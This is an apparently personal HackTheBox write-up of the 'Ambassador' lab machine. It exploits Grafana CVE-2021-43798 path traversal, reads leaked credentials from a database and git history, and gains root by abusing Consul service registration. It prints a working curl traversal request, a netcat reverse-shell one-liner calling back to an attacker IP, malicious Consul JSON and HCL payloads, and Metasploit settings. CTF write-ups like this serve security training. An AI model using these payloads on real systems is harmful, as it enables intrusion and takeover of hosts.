---
title: HackTheBox - Ambassador
categories: [HackTheBox, HackTheBox - Linux]
date: 2022-10-23
tags: [pivot]
img_path: /Writeups/HackTheBox/Linux/Ambassador/images/
image: 
  src: Pasted%20image%2020221024005325.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Overview 
This machine begins w/ a web enumeration, discovering that TCP/3000 is running `grafana`, where it is susceptible to a directory traversal & arbitrary file read vulnerability. w/ this vulnerability, we are able to include grafana configuration file `grafana.ini` & `grafana.db` allowing us to extract `mysql` user credentials. Accessing SQL reveals SSH credentials.

After enumerating the system, `.git-config` is discovered on `developer` home directory, `.git-config` reveals `/opt/my-app` where `.git` exists, allowing us to view all the commits made, revealing credentials for `consul` service. `consul` service is vulnerable to a RCE exploit, whereby attackers can craft a malicious `json` service configuration file to do code execution, privilege escalating us to `root`.
 


---

| Column       | Details      |
| ------------ | ------------ |
| Box Name     | Ambassador   |
| IP           | 10.10.11.183 |
| Points       | 30           |
| Difficulty   | Medium       |
| Creator      |  [DirectRoot](https://www.hackthebox.com/home/users/profile/24906)             |
| Release Date | 	01 Oct 2022             |


# Recon

## TCP/80 (HTTP)
- FFUF
	```bash
	403      GET        9l       28w      277c http://10.10.11.183/.html
	200      GET       92l      143w     1793c http://10.10.11.183/404.html
	301      GET        9l       28w      317c http://10.10.11.183/categories => http://10.10.11.183/categories/
	301      GET        9l       28w      313c http://10.10.11.183/images => http://10.10.11.183/images/
	200      GET      155l      305w     3654c http://10.10.11.183/index.html
	301      GET        9l       28w      312c http://10.10.11.183/posts => http://10.10.11.183/posts/
	200      GET       18l       22w      645c http://10.10.11.183/sitemap.xml
	301      GET        9l       28w      311c http://10.10.11.183/tags => http://10.10.11.183/tags/
	```
	> Nothing really interesting.
	{: .prompt-info}



# Initial Foothold

## TCP/80 (HTTP) 
1. Found a post, revealing a username `developer`
	 ![](Pasted%20image%2020221022123113.png)

## TCP/22 (SSH) - Bruteforce Developer User (Failed)
1. Tried to bruteforce failed.

## TCP/3000 (HTTP) - CVE-2021-43798, Grafana 8.0.0-beta1- 8.3.0 (Arbitrary File Read) 
1. Found a login page @ `http://ambassador.htb:3000/login`
	![](Pasted%20image%2020221022130044.png)
	> Grafana - is a multi-platform open source analytics and interactive visualization web application. It provides charts, graphs, and alerts for the web when connected to supported data sources.
	{: .prompt-info}
2. Search exploits for `Grafana`
	
	| Exploit Title                                               | Path                      |
	| ----------------------------------------------------------- | ------------------------- |
	| Grafana 7.0.1 - Denial of Service (PoC)                     | linux/dos/48638.sh        |
	| Grafana 8.3.0 - Directory Traversal and Arbitrary File Read | multiple/webapps/50581.py |
3. How does `Grafana 8.3.0 - Directory Traversal and Arbitrary File Read` work?
	- `Grafana` is vulnerable to a directory traversal vulnerability due to a lack of path normalization in the `/public/plugins//` URL.
	- Allowing unauthenticated attackers to read sensitive files on the server.
4. Try `Grafana 8.3.0 - Directory Traversal and Arbitrary File Read` - `multiple/webapps/50581.py`
	```
	┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
	└─# python3 50581.py -H http://10.10.11.183:3000
	Read file > /etc/passwd
	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
	systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
	systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
	messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
	syslog:x:104:110::/home/syslog:/usr/sbin/nologin
	_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
	tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
	uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
	tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
	landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
	pollinate:x:110:1::/var/cache/pollinate:/bin/false
	usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
	sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
	systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
	developer:x:1000:1000:developer:/home/developer:/bin/bash
	lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
	grafana:x:113:118::/usr/share/grafana:/bin/false
	mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
	consul:x:997:997::/home/consul:/bin/false
	```
	>  It works!
	{: .prompt-info}
5. Demo -  `Grafana 8.3.0 - Directory Traversal and Arbitrary File Read` - `multiple/webapps/50581.py`
	![](0pSYxUEhNJ.gif)




## TCP/3306 (MySQL) - Access MySQL
1. Access mysql w/ `grafana:dontStandSoCloseToMe63221!`
	```
	┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
	└─# mysql -u grafana -p -h ambassador.htb
	Enter password:
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MySQL connection id is 175
	Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
	
	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
	
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
	MySQL [(none)]>
	```
2. Exfiltrate SSH credentials
	```
	┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
	└─# mysql -u grafana -p -h ambassador.htb
	Enter password:
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MySQL connection id is 177
	Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
	
	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
	
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
	MySQL [(none)]> show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| grafana            |
	| information_schema |
	| mysql              |
	| performance_schema |
	| sys                |
	| whackywidget       |
	+--------------------+
	6 rows in set (0.247 sec)
	
	MySQL [(none)]> use whackywidget;
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A
	
	Database changed
	MySQL [whackywidget]> show tables;
	+------------------------+
	| Tables_in_whackywidget |
	+------------------------+
	| users                  |
	+------------------------+
	1 row in set (0.247 sec)
	
	MySQL [whackywidget]> SELECT * FROM users;
	+-----------+------------------------------------------+
	| user      | pass                                     |
	+-----------+------------------------------------------+
	| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
	+-----------+------------------------------------------+
	1 row in set (0.247 sec)
	
	MySQL [whackywidget]>
	```
3. Decrypt `Base64` encoded password
	```
	┌──(root💀kali)-[~/htb/ambassador]
	└─# echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
	anEnglishManInNewYork027468
	```
	>Valid Creds
	>-  `developer:anEnglishManInNewYork027468`
	{: .prompt-info}

## TCP/22 (SSH) - Successfully SSH
1. SSH w/ `developer:anEnglishManInNewYork027468`
	```
	┌──(root💀kali)-[~/htb/ambassador]
	└─# sshpass -p "anEnglishManInNewYork027468" ssh developer@ambassador.htb
	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	
	  System information as of Sat 22 Oct 2022 06:44:00 AM UTC
	
	  System load:           0.0
	  Usage of /:            84.6% of 5.07GB
	  Memory usage:          55%
	  Swap usage:            0%
	  Processes:             232
	  Users logged in:       0
	  IPv4 address for eth0: 10.10.11.183
	  IPv6 address for eth0: dead:beef::250:56ff:feb9:32a4
	
	
	0 updates can be applied immediately.
	
	
	The list of available updates is more than a week old.
	To check for new updates run: sudo apt update
	Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
	
	
	Last login: Sat Oct 22 01:09:02 2022 from 10.10.14.149
	developer@ambassador:~$ cat user.txt
	db92bc3f23be59a6a4f23743178c8ea4
	```

# Privilege Escalation

## Root - Enumeration (.git Repo)
1. Found `.gitconfig` file, revealing two interesting folders
	```
	developer@ambassador:~$ cat .gitconfig
	[user]
	        name = Developer
	        email = developer@ambassador.local
	[safe]
	        directory = /opt/my-app
	```
	> - `/opt/my-app`
	{: .prompt-info}
2. Found `.git` directory, we can potentially find sensitive information from `git` logs
	```
	developer@ambassador:/opt/my-app$ ls -la
	total 24
	drwxrwxr-x 5 root root 4096 Mar 13  2022 .
	drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
	drwxrwxr-x 4 root root 4096 Mar 13  2022 env
	drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
	-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
	drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
	```

3. View `git` branches 

	```
	developer@ambassador:/opt/my-app$ git branch
	* main
	```
	> - Git branches are effectively a pointer to a snapshot of your changes. When you want to add a new feature or fix a bug
	> - Spawn a new branch to encapsulate your changes.
	> - This makes it harder for unstable code to get merged into the main code base, and it gives you the chance to clean up your future's history before merging it into the main branch. - [Source](https://www.atlassian.com/git/tutorials/using-branches#:~:text=In%20Git%2C%20branches%20are%20a,branch%20to%20encapsulate%20your%20changes.)
	{: .prompt-info}

4. View logs for `main` branch
	```
	developer@ambassador:/opt/my-app$ git log main
	commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
	Author: Developer <developer@ambassador.local>
	Date:   Sun Mar 13 23:47:36 2022 +0000
	
	    tidy config script
	
	commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
	Author: Developer <developer@ambassador.local>
	Date:   Sun Mar 13 23:44:45 2022 +0000
	
	    config script
	
	commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
	Author: Developer <developer@ambassador.local>
	Date:   Sun Mar 13 22:47:01 2022 +0000
	
	    created project with django CLI
	
	commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
	Author: Developer <developer@ambassador.local>
	Date:   Sun Mar 13 22:44:11 2022 +0000
	
	    .gitignore
	```
	> - Git logs displays all the commits being made in that repository in multiple lines along with the commit id, author name, date and commit message. 
	> - There are 2 interesting commits, 
	> 	- `33a53ef9a207976d5ceceddc41a199558843bf3c - tidy config script ` 
	> 	- `8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 - created project with django CLI ` 
	{: .prompt-info}
5. View `8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 - created project with django CLI `
	```
	developer@ambassador:/opt/my-app$ git show 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
	...SNIP...
	+# SECURITY WARNING: keep the secret key used in production secret!
	+SECRET_KEY = 'django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l'
	...SNIP...
	```
	> This is likely a rabbit-hole, because `django-admin` does not exist on `ambassador.htb` & `TCP/8000` (`django` Default Port) is not up.  
	{: .prompt-info}
6. View `33a53ef9a207976d5ceceddc41a199558843bf3c - tidy config script`
	```
	developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
	commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
	Author: Developer <developer@ambassador.local>
	Date:   Sun Mar 13 23:47:36 2022 +0000
	
	    tidy config script
	
	diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
	index 35c08f6..fc51ec0 100755
	--- a/whackywidget/put-config-in-consul.sh
	+++ b/whackywidget/put-config-in-consul.sh
	@@ -1,4 +1,4 @@
	 # We use Consul for application config in production, this script will help set the correct values for the app
	-# Export MYSQL_PASSWORD before running
	+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
	
	-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
	+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
	```
	> `consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 ` - token is revealed, this allows us to access the service.
	{: .prompt-info}
7. Check if `consul` is actually on the `ambassador.htb`
	```
	developer@ambassador:/opt/my-app$ consul
	Usage: consul [--version] [--help] <command> [<args>]
	
	developer@ambassador:/opt/my-app$ netstat -a
	Active Internet connections (servers and established)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State
	tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
	tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
	tcp        0      0 localhost:8600          0.0.0.0:*               LISTEN
	tcp        0      0 localhost:33060         0.0.0.0:*               LISTEN
	tcp        0      0 0.0.0.0:mysql           0.0.0.0:*               LISTEN
	tcp        0      0 localhost:8300          0.0.0.0:*               LISTEN
	tcp        0      0 localhost:8301          0.0.0.0:*               LISTEN
	tcp        0      0 localhost:8302          0.0.0.0:*               LISTEN
	tcp        0      0 localhost:8500          0.0.0.0:*               LISTEN
	```
	> It exists !
	{: .prompt-info}
8. Search exploits for `consul`

	| Exploit Title                                                             | Path                  |
	| ------------------------------------------------------------------------- | --------------------- |
	| Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)        | linux/remote/46073.rb |
	| Hashicorp Consul - Remote Command Execution via Services API (Metasploit) | linux/remote/46074.rb |
9. How does `Hashicorp Consul - Remote Command Execution via Rexec` work?
	- `consul` API is susceptible to a RCE exploit, attackers can construct a malicious `json` service config file for `consul` to do remote code execution.
	- More Info
		- [Hasicorp](https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce/)
		- [Wallarm](https://lab.wallarm.com/consul-by-hashicorp-from-infoleak-to-rce/) 

## Port Forwarding w/ SSH Tunnel
1. We have to be able to access consul on `kali` in order to use the metasploit exploit, we can do so w/ `SSH Tunnel` 
2. Port Forwarding w/ SSH tunnel
	```
	┌──(root💀kali)-[~/htb/ambassador]
	└─# sshpass -p "anEnglishManInNewYork027468" ssh -L8500:127.0.0.1:8500 developer@ambassador.htb
	```
	>  On `kali` port 8500 is forwarded to `ambassador.htb` on port 8500
	{: .prompt-info}
3. Now we can access `consul` on kali
	```
	┌──(root💀kali)-[~/htb/ambassador]
	└─# curl localhost:8500/v1/test
	Invalid URL path: not a recognized HTTP API endpoint
	```
	

## Root - Consul RCE (Metasploit)
1. Launch metasploit
2. Use for `multi/misc/consul_service_exec`
3. Set `OPTIONS`
	```
	msf6 exploit(multi/misc/consul_service_exec) > set ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5
	ACL_TOKEN => bb03b43b-1d81-d62b-24b5-39540ee469b5
	msf6 exploit(multi/misc/consul_service_exec) > set LHOST tun0
	LHOST => 10.10.14.104
	msf6 exploit(multi/misc/consul_service_exec) > set RHOSTS 127.0.0.1
	RHOSTS => 127.0.0.1
	msf6 exploit(multi/misc/consul_service_exec) > set payload linux/x86/meterpreter/reverse_tcp
	payload => linux/x86/meterpreter/reverse_tcp
	```
4. Exploit !
	```
	msf6 exploit(multi/misc/consul_service_exec) > exploit
	
	[*] Started reverse TCP handler on 10.10.14.104:4444
	[*] Creating service 'twNlWsVX'
	[*] Service 'twNlWsVX' successfully created.
	[*] Waiting for service 'twNlWsVX' script to trigger
	[*] Sending stage (989032 bytes) to 10.10.11.183
	[*] Meterpreter session 1 opened (10.10.14.104:4444 -> 10.10.11.183:50154 ) at 2022-10-23 14:53:10 +0800
	[*] Removing service 'twNlWsVX'
	[*] Command Stager progress - 100.00% done (763/763 bytes)
	
	meterpreter > shell
	Process 2932 created.
	Channel 1 created.
	id
	uid=0(root) gid=0(root) groups=0(root)
	```
	![](Pasted%20image%2020221023145738.png)


# Additional

## TCP/3000 (HTTP) - CVE-2021-43798, Grafana 8.0.0-beta1- 8.3.0 (Arbitrary File Read) (Manual)
1. Following this [blogpost](https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/), we are able to leverage this vulnerability to obtain a user on the system.
	- [This github repository as well](https://github.com/jas502n/Grafana-CVE-2021-43798)
2. Where login credentials are stored in `Grafana`
	- [Configuration File (`/etc/grafana/grafana.ini`)](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#linux) 
	- [Which part of the configuration file holds the credentials](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#security)
	- [Database Configuration File  (`/var/lib/grafana/grafana.db`)](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/#paths)
3. Read `/etc/grafana/grafana.ini`
	```
	...SNIP...
	############################## Security ####################################
	[security]
	# disable creation of admin user on first start of grafana
	;disable_initial_admin_creation = false
	
	# default admin user, created on startup
	;admin_user = admin
	
	# default admin password, can be changed before first start of grafana,  or in profile settings
	admin_password = messageInABottle685427
	
	# used for signing
	;secret_key = SW2YcwTIb9zpOOhoPsMm
	
	...SNIP...
	```
	>- `;` - is a comment, meaning configuration is not active
	>- `admin:messageInABottle685427`
	>- `SW2YcwTIb9zpOOhoPsMm`
	{: .prompt-info}
4. Tried to bruteforce SSH, failed
	```
	┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
	└─# cat usernames.txt
	root
	grafana
	developer
	
	┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
	└─# cat passwords.txt
	messageInABottle685427
	
	┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
	└─# hydra -L usernames.txt -P passwords.txt ssh://ambassador.htb -e nsr -I
	Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-22 13:41:07
	[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
	[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:3/p:4), ~1 try per task
	[DATA] attacking ssh://ambassador.htb:22/
	1 of 1 target completed, 0 valid password found
	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-22 13:41:17
	```
5. Successfully login w/ `admin:messageInABottle685427`
	![](Pasted%20image%2020221022133911.png)
	> However, `grafana` is not susceptible to any RCE exploit, lets try to obtain another set of credential by reading `Grafana` database file.
	{: .prompt-info}
6. Download `/var/lib/grafana/grafana.db` 
	```
	┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit]
	└─# curl -s "http://ambassador.htb:3000/public/plugins/jaeger/../../../../../../../../../../../../../var/lib/grafana/grafana.db" --path-as-is -o grafana.db
	```
7. View `sqlite` database file `grafana.db` w/ `sqlitebrowser`
	1. Download `sqlitebrowser`
		```
		sudo add-apt-repository -y ppa:linuxgndu/sqlitebrowser
		sudo apt-get update
		sudo apt-get install sqlitebrowser
		```
	2. Read `grafana.db` w/ `sqlitebrowser`
		```
		# Query
		SELECT user, password, secure_json_data FROM data_source;
		```
		![](Pasted%20image%2020221022145207.png)
	>Valid Creds
	>- `grafana:dontStandSoCloseToMe63221!`
	{: .prompt-info}

## Root - Consul RCE (Manual)
1. Create malicious `json` service configuration file to do RCE via `consul` API
	```json
	# Filename: exploit.json
	{
	  "ID": "Reverse Shell",
	  "Name": "Reverse Shell",
	  "Address": "127.0.0.1",
	  "Port": 80,
	  "check": {
	    "Args": [
	      "sh",
	      "-c",
	      "sh /tmp/exploit.sh"
	    ],
	    "interval": "10s",
	    "Timeout": "86400s"
	  }
	}
	```
1. Create payload `exploit.sh`
	```
	#!/bin/bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.104 4444 >/tmp/f
	```
3. Register the malicious service 
	```
	developer@ambassador:/tmp$ curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" --request PUT -T exploit.json http://127.0.0.1:8500/v1/agent/service/register
	```
4. `root` shell obtained
	```
	┌──(root💀kali)-[~/htb/photobomb]
	└─# nc -nvlp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	Ncat: Listening on 0.0.0.0:4444
	id
	Ncat: Connection from 10.10.11.183.
	Ncat: Connection from 10.10.11.183:58570.
	/bin/sh: 0: can't access tty; job control turned off
	# uid=0(root) gid=0(root) groups=0(root)
	```
5. `root` hash
	```
	$6$AY/Hqk/PJgettbhs$mgg2hluJ8.leTpnrlEkh4RF7qE6Ns9j/TtV3Sx5OIsZ2YEA0OjGsJpmQlX2CFMmbwNjmvCZy9/Rcea4nF799V0
	```
6. Demo - `consul` RCE (manual)
	![](EXrqjmnOxo.gif)

## Root - Config.d Directory
1. From [Ippsec](https://www.youtube.com/watch?v=6M_6rapjTL0&t=1220s)
2. Instead of using the API to register our malicious service, write a `.hcl` configuration file that will execute our reverse shell to the `config.d` directory.
3. Proceed to `/etc/consul.d`, view files in directory
	```
	developer@ambassador:/etc/consul.d$ ls -la
	total 24
	drwxr-xr-x   3 consul consul    4096 Sep 27 14:49 .
	drwxr-xr-x 103 root   root      4096 Sep 27 14:49 ..
	drwx-wx---   2 root   developer 4096 Sep 14 11:00 config.d
	-rw-r--r--   1 consul consul       0 Feb 28  2022 consul.env
	-rw-r--r--   1 consul consul    5303 Mar 14  2022 consul.hcl
	-rw-r--r--   1 consul consul     160 Mar 15  2022 README
	developer@ambassador:/etc/consul.d$
	```
	>  `drwx-wx---   2 root   developer 4096 Sep 14 11:00 config.d`
	>   - Write and Execute access for group `developer` for `config.d` directory
	{: .prompt-info}
2. Create `exploit.hcl` to execute our reverse shell
	```
	developer@ambassador:/etc/consul.d/config.d$ nano exploit.hcl
	
	check = {
		id = "rooted"
		args = ["/bin/bash", "/tmp/exploit.sh"],
		interval = "5s"
		}
	```
3. Reload `consul` to apply our configuration
	```
	developer@ambassador:/etc/consul.d/config.d$ consul reload --token bb03b43b-1d81-d62b-24b5-39540ee469b5
	Configuration reload triggered
	```
4. Start listener and wait for reverse shell to execute
5. Demo - Write to `/etc/consul.d/config.d`
	![](UrMBaoxamu.gif)

##  AESDecrypt Tool Fix
1. If secureJsonData is used we have to decrypt it in order to obtain the password for `sqlite`
2. Use this [tool](https://github.com/grafana/grafana/blob/main/pkg/util/encryption.go) to do so
	```
	┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798]
	└─# go run AESDecrypt.go
	AESDecrypt.go:12:2: cannot find package "golang.org/x/crypto/pbkdf2" in any of:
	        /usr/lib/go-1.17/src/golang.org/x/crypto/pbkdf2 (from $GOROOT)
	        /root/go/src/golang.org/x/crypto/pbkdf2 (from $GOPATH)
	```
	> Failed
	{: .prompt-info}
2. Fix Error - [Source](https://juejin.cn/post/7148784966808109063)
	1. Create `/usr/lib/go-1.17/src/golang.org/x/` directory
		```
		┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798]
		└─# mkdir -p /usr/lib/go-1.17/src/golang.org/x/
		```
	2. Proceed to `/usr/lib/go-1.17/src/golang.org/x/` and clone golang crypto repo
		```
		┌──(root💀kali)-[/usr/lib/go-1.17/src/golang.org/x]
		└─# git clone https://github.com/golang/crypto.git
		Cloning into 'crypto'...
		```
	3. Fixed !
		```
		┌──(root💀kali)-[~/htb/ambassador/10.10.11.183/exploit/Grafana-CVE-2021-43798]
		└─# go run AESDecrypt.go
		[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
		[*] DataSourcePassword= R3pMVVh1UHLoUkTJOl+Z/sFymLqolUOVtxCtQL/y+Q==
		[*] plainText= jas502n
		
		
		[*] grafanaIni_secretKey= SW2YcwTIb9zpOOhoPsMm
		[*] PlainText= jas502n
		[*] EncodePassword= VTh1akR5aFf7zo3AvF2q8+8h69PdTvFtcjwBl70sjg==
		```
	

## Decrypt secureJsonData Password w/ AESDecrypt
If `secureJsonData` is used 
1. There are a few information we need to decrypt the password
	- `grafanaIni_secretKey` - `/etc/grafana/grafana.ini`
	- `dataSourcePassword` - `/var/lib/grafana/grafana.db` - use `sqlitebrowser` to view `data_source` table, obtain `secure_json_data` column value.
